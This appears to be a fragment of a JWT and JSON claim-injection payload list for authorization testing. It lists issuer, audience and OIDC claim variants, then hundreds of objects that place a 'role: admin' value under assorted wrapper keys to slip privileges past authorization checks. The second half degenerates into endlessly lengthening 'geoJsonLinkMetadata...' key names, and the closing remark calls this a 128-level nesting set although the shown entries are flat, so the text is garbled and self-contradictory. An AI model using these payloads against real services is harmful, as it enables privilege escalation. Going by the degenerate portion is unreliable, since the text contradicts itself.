{"iss":"https://target.tld"},{"iss":"target"},{"iss":"api"}
{"iss":"auth"},{"iss":"sso"},{"iss":"idp"},{"iss":"oidc"}
{"aud":"admin"},{"aud":"target"},{"aud":"api"},{"aud":"app"}
{"aud":["target","admin"]},{"aud":["api","admin"]}
{"jti":"1"},{"jti":"a"},{"jti":""},{"jti":null}
{"typ":"JWT"},{"typ":"at+jwt"},{"typ":"id_token"},{"typ":"access_token"}
{"cty":"JWT"},{"cty":"jwk+json"}
{"nonce":"x"},{"azp":"x"}
{"cnf":{"jwk":{"kty":"RSA","n":"...","e":"AQAB"}}}
{"cnf":{"kid":"a"}}
{"vc":{"type":["VerifiableCredential"],"credentialSubject":{"role":"admin"}}}
{"vp":{"verifiableCredential":[{"type":["VerifiableCredential"],"credentialSubject":{"role":"admin"}}]}}
{"delegated_sub":"admin"},{"delegatedSub":"admin"}
{"act":{"sub":"admin"}},{"may_act":{"sub":"admin"}}
{"authorized_party":"admin"},{"azp":"admin"}
{"sid":"<another-session-id>"},{"session_state":"<another>"}
{"auth_time":0},{"acr":"1"},{"acr":"2"},{"amr":["pwd","otp"]}
{"at_hash":"x"},{"c_hash":"x"},{"s_hash":"x"}
{"updated_at":0}
{"picture":"x"},{"preferred_username":"admin"},{"given_name":"admin"}
{"family_name":"admin"},{"middle_name":"admin"},{"nickname":"admin"}
{"profile":"x"},{"website":"x"},{"gender":"x"},{"birthdate":"x"}
{"zoneinfo":"x"},{"locale":"x"}
{"phone_number":"x"},{"phone_number_verified":true}
{"address":{"formatted":"x","street_address":"x","locality":"x","region":"x","postal_code":"x","country":"x"}}
{"email_verified":true},{"phone_number_verified":true}
{"hd":"x"},{"domain":"x"},{"tenant":"x"}
{"custom:role":"admin"},{"custom:isAdmin":true}
{"cognito:groups":["admin"]},{"cognito:username":"admin"}
{"realm_access":{"roles":["admin"]}}
{"resource_access":{"app":{"roles":["admin"]}}}
{"authorities":["admin"]},{"authorities":["ROLE_ADMIN"]}
{"user_authorities":["admin"]}
{"userClaims":{"role":"admin"}}
{"claims":{"role":"admin"}}
{"extra":{"role":"admin"}}
{"metadata":{"role":"admin"}}
{"user":{"role":"admin"}},{"user":{"isAdmin":true}}
{"user":{"id":1,"role":"admin"}}
{"account":{"role":"admin"}},{"profile":{"role":"admin"}}
{"identity":{"role":"admin"}},{"principal":{"role":"admin"}}
{"credential":{"role":"admin"}},{"auth":{"role":"admin"}}
{"context":{"user":{"role":"admin"}}}
{"data":{"role":"admin"}},{"payload":{"role":"admin"}}
{"input":{"role":"admin"}},{"attrs":{"role":"admin"}}
{"fields":{"role":"admin"}},{"settings":{"role":"admin"}}
{"options":{"role":"admin"}},{"preferences":{"role":"admin"}}
{"env":{"role":"admin"}},{"environment":{"role":"admin"}}
{"vars":{"role":"admin"}},{"variables":{"role":"admin"}}
{"state":{"role":"admin"}},{"status":{"role":"admin"}}
{"mode":{"role":"admin"}},{"type":{"role":"admin"}}
{"kind":{"role":"admin"}},{"category":{"role":"admin"}}
{"class":{"role":"admin"}},{"group":{"role":"admin"}}
{"team":{"role":"admin"}},{"org":{"role":"admin"}}
{"tenant":{"role":"admin"}},{"account":{"role":"admin"}}
{"profile":{"role":"admin"}},{"identity":{"role":"admin"}}
{"principal":{"role":"admin"}},{"credential":{"role":"admin"}}
{"auth":{"role":"admin"}},{"session":{"role":"admin"}}
{"token":{"role":"admin"}},{"jwt":{"role":"admin"}}
{"apiKey":{"role":"admin"}},{"key":{"role":"admin"}}
{"secret":{"role":"admin"}},{"password":{"role":"admin"}}
{"passwd":{"role":"admin"}},{"pwd":{"role":"admin"}}
{"hash":{"role":"admin"}},{"salt":{"role":"admin"}}
{"code":{"role":"admin"}},{"pin":{"role":"admin"}}
{"otp":{"role":"admin"}},{"mfa":{"role":"admin"}}
{"mfaCode":{"role":"admin"}},{"twoFactor":{"role":"admin"}}
{"twoFactorCode":{"role":"admin"}},{"totp":{"role":"admin"}}
{"totpCode":{"role":"admin"}},{"backup":{"role":"admin"}}
{"backupCode":{"role":"admin"}},{"recovery":{"role":"admin"}}
{"recoveryCode":{"role":"admin"}},{"reset":{"role":"admin"}}
{"resetCode":{"role":"admin"}},{"forgot":{"role":"admin"}}
{"forgotCode":{"role":"admin"}},{"change":{"role":"admin"}}
{"changeCode":{"role":"admin"}},{"invite":{"role":"admin"}}
{"inviteCode":{"role":"admin"}},{"referral":{"role":"admin"}}
{"referralCode":{"role":"admin"}},{"ref":{"role":"admin"}}
{"refCode":{"role":"admin"}},{"source":{"role":"admin"}}
{"src":{"role":"admin"}},{"campaign":{"role":"admin"}}
{"campaignId":{"role":"admin"}},{"promo":{"role":"admin"}}
{"promoCode":{"role":"admin"}},{"coupon":{"role":"admin"}}
{"couponCode":{"role":"admin"}},{"discount":{"role":"admin"}}
{"discountCode":{"role":"admin"}},{"gift":{"role":"admin"}}
{"giftCode":{"role":"admin"}},{"voucher":{"role":"admin"}}
{"voucherCode":{"role":"admin"}},{"credit":{"role":"admin"}}
{"creditCode":{"role":"admin"}},{"debit":{"role":"admin"}}
{"debitCode":{"role":"admin"}},{"balance":{"role":"admin"}}
{"wallet":{"role":"admin"}},{"fund":{"role":"admin"}}
{"funds":{"role":"admin"}},{"creditCard":{"role":"admin"}}
{"debitCard":{"role":"admin"}},{"card":{"role":"admin"}}
{"cardNumber":{"role":"admin"}},{"cardNumberCode":{"role":"admin"}}
{"cvv":{"role":"admin"}},{"cvvCode":{"role":"admin"}}
{"expiry":{"role":"admin"}},{"expiryDate":{"role":"admin"}}
{"exp":{"role":"admin"}},{"expDate":{"role":"admin"}}
{"iban":{"role":"admin"}},{"swift":{"role":"admin"}}
{"routing":{"role":"admin"}},{"account":{"role":"admin"}}
{"accountNumber":{"role":"admin"}},{"accountId":{"role":"admin"}}
{"bank":{"role":"admin"}},{"bankId":{"role":"admin"}}
{"branch":{"role":"admin"}},{"branchId":{"role":"admin"}}
{"paypal":{"role":"admin"}},{"stripe":{"role":"admin"}}
{"braintree":{"role":"admin"}},{"square":{"role":"admin"}}
{"adyen":{"role":"admin"}},{"checkout":{"role":"admin"}}
{"payment":{"role":"admin"}},{"paymentMethod":{"role":"admin"}}
{"paymentId":{"role":"admin"}},{"transaction":{"role":"admin"}}
{"transactionId":{"role":"admin"}},{"order":{"role":"admin"}}
{"orderId":{"role":"admin"}},{"purchase":{"role":"admin"}}
{"purchaseId":{"role":"admin"}},{"invoice":{"role":"admin"}}
{"invoiceId":{"role":"admin"}},{"bill":{"role":"admin"}}
{"billId":{"role":"admin"}},{"subscription":{"role":"admin"}}
{"subscriptionId":{"role":"admin"}},{"plan":{"role":"admin"}}
{"planId":{"role":"admin"}},{"tier":{"role":"admin"}}
{"tierId":{"role":"admin"}},{"level":{"role":"admin"}}
{"levelId":{"role":"admin"}},{"license":{"role":"admin"}}
{"licenseId":{"role":"admin"}},{"product":{"role":"admin"}}
{"productId":{"role":"admin"}},{"sku":{"role":"admin"}}
{"skuId":{"role":"admin"}},{"item":{"role":"admin"}}
{"itemId":{"role":"admin"}},{"asset":{"role":"admin"}}
{"assetId":{"role":"admin"}},{"resource":{"role":"admin"}}
{"resourceId":{"role":"admin"}},{"object":{"role":"admin"}}
{"objectId":{"role":"admin"}},{"entity":{"role":"admin"}}
{"entityId":{"role":"admin"}},{"node":{"role":"admin"}}
{"nodeId":{"role":"admin"}},{"record":{"role":"admin"}}
{"recordId":{"role":"admin"}},{"entry":{"role":"admin"}}
{"entryId":{"role":"admin"}},{"row":{"role":"admin"}}
{"rowId":{"role":"admin"}},{"result":{"role":"admin"}}
{"resultId":{"role":"admin"}},{"document":{"role":"admin"}}
{"documentId":{"role":"admin"}},{"doc":{"role":"admin"}}
{"docId":{"role":"admin"}},{"file":{"role":"admin"}}
{"fileId":{"role":"admin"}},{"fileName":{"role":"admin"}}
{"filePath":{"role":"admin"}},{"fileUrl":{"role":"admin"}}
{"path":{"role":"admin"}},{"pathName":{"role":"admin"}}
{"pathValue":{"role":"admin"}},{"url":{"role":"admin"}}
{"uri":{"role":"admin"}},{"link":{"role":"admin"}}
{"href":{"role":"admin"}},{"endpoint":{"role":"admin"}}
{"endpointUrl":{"role":"admin"}},{"target":{"role":"admin"}}
{"targetUrl":{"role":"admin"}},{"destination":{"role":"admin"}}
{"destinationUrl":{"role":"admin"}},{"source":{"role":"admin"}}
{"sourceUrl":{"role":"admin"}},{"callback":{"role":"admin"}}
{"callbackUrl":{"role":"admin"}},{"webhook":{"role":"admin"}}
{"webhookUrl":{"role":"admin"}},{"redirect":{"role":"admin"}}
{"redirectUrl":{"role":"admin"}},{"return":{"role":"admin"}}
{"returnUrl":{"role":"admin"}},{"next":{"role":"admin"}}
{"nextUrl":{"role":"admin"}},{"previous":{"role":"admin"}}
{"previousUrl":{"role":"admin"}},{"back":{"role":"admin"}}
{"backUrl":{"role":"admin"}},{"forward":{"role":"admin"}}
{"forwardUrl":{"role":"admin"}},{"origin":{"role":"admin"}}
{"originUrl":{"role":"admin"}},{"referer":{"role":"admin"}}
{"referrer":{"role":"admin"}},{"refererUrl":{"role":"admin"}}
{"referrerUrl":{"role":"admin"}},{"domain":{"role":"admin"}}
{"domainName":{"role":"admin"}},{"host":{"role":"admin"}}
{"hostname":{"role":"admin"}},{"hostName":{"role":"admin"}}
{"port":{"role":"admin"}},{"portNumber":{"role":"admin"}}
{"ip":{"role":"admin"}},{"ipAddress":{"role":"admin"}}
{"addr":{"role":"admin"}},{"address":{"role":"admin"}}
{"addressLine":{"role":"admin"}},{"addressLine1":{"role":"admin"}}
{"addressLine2":{"role":"admin"}},{"city":{"role":"admin"}}
{"cityName":{"role":"admin"}},{"state":{"role":"admin"}}
{"stateName":{"role":"admin"}},{"country":{"role":"admin"}}
{"countryName":{"role":"admin"}},{"zip":{"role":"admin"}}
{"zipCode":{"role":"admin"}},{"postal":{"role":"admin"}}
{"postalCode":{"role":"admin"}},{"lat":{"role":"admin"}}
{"latitude":{"role":"admin"}},{"lon":{"role":"admin"}}
{"lng":{"role":"admin"}},{"longitude":{"role":"admin"}}
{"geo":{"role":"admin"}},{"geoLocation":{"role":"admin"}}
{"geoPoint":{"role":"admin"}},{"geoJson":{"role":"admin"}}
{"geoJsonPoint":{"role":"admin"}},{"geoJsonLine":{"role":"admin"}}
{"geoJsonPolygon":{"role":"admin"}},{"geoJsonMultiPoint":{"role":"admin"}}
{"geoJsonMultiLine":{"role":"admin"}},{"geoJsonMultiPolygon":{"role":"admin"}}
{"geoJsonGeometry":{"role":"admin"}},{"geoJsonGeometryCollection":{"role":"admin"}}
{"geoJsonFeature":{"role":"admin"}},{"geoJsonFeatureCollection":{"role":"admin"}}
{"geoJsonObject":{"role":"admin"}},{"geoJsonType":{"role":"admin"}}
{"geoJsonCoordinates":{"role":"admin"}},{"geoJsonCrs":{"role":"admin"}}
{"geoJsonBbox":{"role":"admin"}},{"geoJsonProperties":{"role":"admin"}}
{"geoJsonId":{"role":"admin"}},{"geoJsonTitle":{"role":"admin"}}
{"geoJsonDescription":{"role":"admin"}},{"geoJsonLink":{"role":"admin"}}
{"geoJsonLinks":{"role":"admin"}},{"geoJsonLinkHref":{"role":"admin"}}
{"geoJsonLinkType":{"role":"admin"}},{"geoJsonLinkRel":{"role":"admin"}}
{"geoJsonLinkTitle":{"role":"admin"}},{"geoJsonLinkHreflang":{"role":"admin"}}
{"geoJsonLinkLength":{"role":"admin"}},{"geoJsonLinkMedia":{"role":"admin"}}
{"geoJsonLinkMetadata":{"role":"admin"}},{"geoJsonLinkMetadataType":{"role":"admin"}}
{"geoJsonLinkMetadataValue":{"role":"admin"}},{"geoJsonLinkMetadataName":{"role":"admin"}}
{"geoJsonLinkMetadataDescription":{"role":"admin"}},{"geoJsonLinkMetadataLink":{"role":"admin"}}
{"geoJsonLinkMetadataLinks":{"role":"admin"}},{"geoJsonLinkMetadataLinkHref":{"role":"admin"}}
{"geoJsonLinkMetadataLinkType":{"role":"admin"}},{"geoJsonLinkMetadataLinkRel":{"role":"admin"}}
{"geoJsonLinkMetadataLinkTitle":{"role":"admin"}},{"geoJsonLinkMetadataLinkHreflang":{"role":"admin"}}
{"geoJsonLinkMetadataLinkLength":{"role":"admin"}},{"geoJsonLinkMetadataLinkMedia":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadata":{"role":"admin"}},{"geoJsonLinkMetadataLinkMetadataType":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataValue":{"role":"admin"}},{"geoJsonLinkMetadataLinkMetadataName":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataDescription":{"role":"admin"}},{"geoJsonLinkMetadataLinkMetadataLink":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinks":{"role":"admin"}},{"geoJsonLinkMetadataLinkMetadataLinkHref":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkType":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkRel":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkTitle":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkHreflang":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkLength":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMedia":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadata":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataType":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataValue":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataName":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataDescription":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLink":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinks":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkHref":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkType":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkRel":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkTitle":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkHreflang":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkLength":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMedia":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadata":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataType":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataValue":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataName":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataDescription":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLink":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinks":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkHref":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkType":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkRel":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkTitle":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkHreflang":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkLength":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMedia":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadata":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataType":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataValue":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataName":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataDescription":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLink":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinks":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkHref":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkType":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkRel":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkTitle":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkHreflang":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkLength":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMedia":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadata":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataType":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataValue":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataName":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataDescription":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLink":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinks":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkHref":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkType":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkRel":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkTitle":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkHreflang":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkLength":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMedia":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadata":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataType":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataValue":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataName":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataDescription":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLink":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinks":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkHref":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkType":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkRel":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkTitle":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkHreflang":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkLength":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMedia":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadata":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataType":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataValue":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataName":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataDescription":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLink":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinks":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkHref":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkType":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkRel":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkTitle":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkHreflang":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkLength":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMedia":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadata":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataType":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataValue":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataName":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataDescription":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLink":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinks":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkHref":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkType":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkRel":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkTitle":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkHreflang":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkLength":{"role":"admin"}}
{"geoJsonLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMetadataLinkMedia":{"role":"admin"}}
```

The last batch is the *deep-nesting* set — 128 levels of the same field
wrapper, for parsers that recurse into JSON: any level could be where the
auth check stops looking.
